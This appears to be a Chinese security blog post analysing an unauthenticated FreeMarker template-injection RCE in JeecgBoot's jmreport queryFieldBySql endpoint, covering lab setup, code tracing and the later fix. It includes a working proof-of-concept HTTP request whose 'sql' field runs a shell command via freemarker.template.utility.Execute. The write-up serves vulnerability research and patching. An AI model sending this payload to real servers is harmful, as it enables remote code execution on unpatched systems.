#  jeecg boot queryFieldBySql RCE漏洞分析   
原创 kkk  漏洞推送   2025-02-08 08:59  
  
## 环境搭建  
## 后端  
  
源码地址:  
  
https://github.com/jeecgboot/JeecgBoot  
  
找到v3.5.3的commit，创建一个分支  
  
![image-20250108162704224](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1ezgUbytNSX4hX79bFqAZuCnYqmAWIvYuicKZQ7eNrpaGJ8XQpYscqyeGpNEo7Pn3niaB9LiarCsMUYA/640?wx_fmt=png&from=appmsg "null")  
  
安装Maven依赖  
  
数据库配置文件: jeecg-module-system/jeecg-system-start/src/main/resources/application-dev.yml  
  
启动mysql: docker run -itd --name jeecg_mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root mysql:5.7  
  
解决Table 'test.QRTZ_TRIGGERS' doesn't exist  
问题  
  
docker cp jeecg_mysql:/etc/my.cnf my.cnf  
  
[mysqld]下面加入  
  
lower_case_table_names=1  
  
docker cp my.cnf jeecg_mysql:/etc/my.cnf  
  
重启mysql  
  
导入数据库: jeecg-boot/db/jeecgboot-mysql-5.7.sql  
  
启动redis: docker run -itd -p 6379:6379 --name jeecg_redis redis  
  
启动项目: jeecg-system-start/src/main/java/org/jeecg/JeecgSystemApplication.java  
## 漏洞复现  
  
poc:  
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.1.108:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0 Config/100.2.9281.82
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: zh-CN,zh
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Content-Length: 124

{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"touch /tmp/success\")}",
    "type": "0"
}
```  
## 漏洞分析  
  
jeecg使用shiro做鉴权框架，配置文件在 src/main/java/org/jeecg/config/shiro/ShiroConfig.java  
  
设置了jmreport api排除  
```
//积木报表排除
filterChainDefinitionMap.put("/jmreport/**", "anon");
filterChainDefinitionMap.put("/**/*.js.map", "anon");
filterChainDefinitionMap.put("/**/*.css.map", "anon");
```  
  
反编译jar包，定位到漏洞路由  
  
/org/jeecgframework/jimureport/jimureport-spring-boot-starter/1.5.9/jimureport-spring-boot-starter-1.5.9.jar!/org/jeecg/modules/jmreport/desreport/a/a.class:596#parseReportSql  
  
![image-20250109110609977](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1ezgUbytNSX4hX79bFqAZuCnqza8ib75xs303uEkZ7YAkjNUgva8wDOAClMEogEDWdLjxEEUxAkbEw/640?wx_fmt=png&from=appmsg "null")  
  
request进入到c函数后，有一个简单的sql过滤的处理  
  
![image-20250113135526089](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1ezgUbytNSX4hX79bFqAZuCOqBHbIZLgL5VlBaFo2SfibFJLh5BsOcaYiaPFwbFeUMqJ1q3E33hneaA/640?wx_fmt=png&from=appmsg "null")  
  
然后传递给org.jeecg.modules.jmreport.desreport.service.a.i  
的parseReportSql  
方法  
```
 @PostMapping({"/queryFieldBySql"})
    public Result<?> c(@RequestBody JSONObject var1) {
        ...
        Map var12 = this.reportDbService.parseReportSql(var2, var3, var4, var5);
        ...
    }
```  
  
parseReportSql函数中,主要关注 sql = f.a(sql, var8, (JSONArray)null);  
```
public Map<String, Object> parseReportSql(String sql, String dbKey, Object paramArray, String type) throws JimuReportException {
        HashMap var5 = new HashMap(5);
        new ArrayList();
        String var7 = this.jimuTokenClient.getToken();
        Map var8 = null;
        if (g.d(var7)) {
            var8 = this.jimuTokenClient.getUserInfo(var7);
        }

        if (g.d(paramArray)) {
            sql = f.a(sql, var8, JSONArray.parseArray(paramArray.toString()));
        } else {
            sql = f.a(sql, var8, (JSONArray)null);
        }
        ...
}
```  
  
a函数传递给了另一个a函数  
```
public static String a(String var0, Map<String, Object> var1, JSONArray var2) {
    ...
    var0 = a(var2, var0);
    ...
}
```  
  
a函数传递给了FreeMarkerUtils的a函数  
```
public static String a(JSONArray var0, String var1) {
    ...
    var1 = FreeMarkerUtils.a(var1, var2);
    ...
}
```  
  
FreeMarkerUtils的a函数如下，将sql语句带入模板进行执行，完成rce:  
```
public static String a(String var0, Map<String, Object> var1) {
        if (var0 == null) {
            return null;
        } else {
            Configuration var2 = new Configuration();
            var2.setNumberFormat("#.#########");
            var2.setSharedVariable("func", new FunctionMethod());
            var1.put("jeecg", new FreemarkerMethod());
            var1.put("isNotEmpty", new NotEmptyMethod());
            var2.setClassicCompatible(true);
            StringWriter var3 = new StringWriter();

            try {
                a.debug("模板内容:{}", var0.toString());
                (new Template("template", new StringReader(var0), var2)).process(var1, var3);
                a.debug("模板解析结果:{}", var3.toString());
            } catch (TemplateException var5) {
                var5.printStackTrace();
            } catch (IOException var6) {
                var6.printStackTrace();
            }

            return var3.toString();
        }
    }
```  
## 漏洞修复  
  
更新到最新代码后，直接访问发现提示token检验识别  
  
![image-20250113164504940](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1ezgUbytNSX4hX79bFqAZuCE6vibt1ToXq9oyoeDXia1bUl3KEHJS35RRdh0WcSvsmGcqFxWJN4mfCQ/640?wx_fmt=png&from=appmsg "null")  
  
但是在shiro中并没有对这个权限进行校验  
```
//积木报表排除
filterChainDefinitionMap.put("/jmreport/**", "anon");
```  
  
根据日志o.j.m.j.c.f.interceptor.JimuReportTokenInterceptor:131  
 可以找到相关的过滤代码  
```
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (!(handler instanceof HandlerMethod)) {
            return true;
        } else {
            String var4 = e.j(request.getRequestURI().substring(request.getContextPath().length()));
            short var5 = 500;
            if (m.a(var4)) {
                log.error("请注意，请求地址有xss攻击风险！" + var4);
                this.backError(response, "请求地址有xss攻击风险!", Integer.valueOf(var5));
                return false;
            } else {
                String var6 = this.jmBaseConfig.getCustomPrePath();
                if (OkConvertUtils.isNotEmpty(var6) && !var6.startsWith("/")) {
                    var6 = "/" + var6;
                }

                request.setAttribute("customPrePath", var6);
                HandlerMethod var7 = (HandlerMethod)handler;
                Method var8 = var7.getMethod();
                if (var4.contains("/jmreport/shareView/")) {
                    return true;
                } else {
                    JimuNoLoginRequired var9 = (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);
                    if (OkConvertUtils.isNotEmpty(var9)) {
                        return true;
                    } else {
                        boolean var10 = false;

                        try {
                            var10 = this.verifyToken(request);
                        } catch (Exception var14) {
                        }

                        if (!var10) {
                            if (this.jimuReportShareService.isSharingEffective(var4, request)) {
                                return true;
                            } else {
                                String var16 = request.getParameter("previousPage");
                                if (OkConvertUtils.isNotEmpty(var16)) {
                                    if (!var4.startsWith("/jmreport/view")) {
                                        log.error("不被允许的钻取请求地址(" + request.getMethod() + ")：" + var4);
                                        this.backError(response, "Token校验失败，无权限访问！", Integer.valueOf(var5));
                                        return false;
                                    } else if (this.jimuReportShareService.isShareingToken(var4, request)) {
                                        return true;
                                    } else {
                                        log.error("分享链接失效或分享token不匹配(" + request.getMethod() + ")：" + var4);
                                        this.backError(response, "分享链接失效或分享token不匹配，禁止钻取!", Integer.valueOf(var5));
                                        return false;
                                    }
                                } else {
                                    log.error("Token校验失败！请求无权限(" + request.getMethod() + ")：" + var4);
                                    this.backError(response, "Token校验失败，无权限访问！", Integer.valueOf(var5));
                                    return false;
                                }
                            }
                        } else {
                            RequiresRoles var15 = (RequiresRoles)var8.getAnnotation(RequiresRoles.class);
                            Result var11 = this.permissionsVerifyHandler.verifyRoles(request, var15, var4);
                            if (OkConvertUtils.isNotEmpty(var11) && !var11.isSuccess()) {
                                this.backError(response, OkConvertUtils.getString(var11.getMessage(), "没有权限，请联系管理员分配权限！"), OkConvertUtils.getInt(var11.getCode(), var5));
                                return false;
                            } else {
                                RequiresPermissions var12 = (RequiresPermissions)var8.getAnnotation(RequiresPermissions.class);
                                Result var13 = this.permissionsVerifyHandler.verifyPermissions(request, var12);
                                if (OkConvertUtils.isNotEmpty(var13) && !var13.isSuccess()) {
                                    this.backError(response, OkConvertUtils.getString(var13.getMessage(), "没有权限，请联系管理员分配权限！"), OkConvertUtils.getInt(var13.getCode(), var5));
                                    return false;
                                } else {
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
```  
  
如果方法没有使用JimuNoLoginRequired注解就需要验证token，并且强制要求url以/jmreport/view  
开头，否则不允许访问  
  
![image-20250113173222516](https://mmbiz.qpic.cn/sz_mmbiz_png/noZJ3Kqbu1ezgUbytNSX4hX79bFqAZuCVI8oQubVo1B3QfGODjzBqaeaeG8gJ5eqDd8zwAWOfA63OjVKj9El5g/640?wx_fmt=png&from=appmsg "null")  
## 参考文档  
> https://help.jeecg.com/java/setup/idea/startup.html  
  
  
  
